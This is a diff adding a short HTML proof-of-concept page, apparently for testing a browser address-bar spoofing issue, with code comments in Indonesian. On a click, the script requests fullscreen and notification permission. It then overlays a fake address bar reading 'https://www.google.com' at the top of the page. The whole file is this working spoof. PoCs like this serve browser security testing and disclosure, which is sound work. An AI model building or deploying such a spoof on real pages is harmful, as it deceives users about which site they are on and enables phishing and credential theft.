@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Bar Spoof PoC</title>
+</head>
+<body>
+    <h1>Click anywhere to test PoC</h1>
+</body>
+<script>
+    document.addEventListener("click", () => {
+        // Meminta layar penuh
+        document.documentElement.requestFullscreen();
+
+        // Meminta izin notifikasi
+        Notification.requestPermission().then((permission) => {
+            if (permission === "granted") {
+                // Membuat overlay UI palsu
+                const fakeAddressBar = document.createElement("div");
+                fakeAddressBar.style = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 40px;
+                    background-color: white;
+                    color: black;
+                    z-index: 9999;
+                    display: flex;
+                    align-items: center;
+                    padding: 0 10px;
+                    font-family: Arial, sans-serif;
+                    box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.3);
+                `;
+                fakeAddressBar.innerText = "https://www.google.com";
+
+                // Menambahkan UI palsu ke halaman
+                document.body.appendChild(fakeAddressBar);
+            }
+        });
+    });
+</script>
+</html>
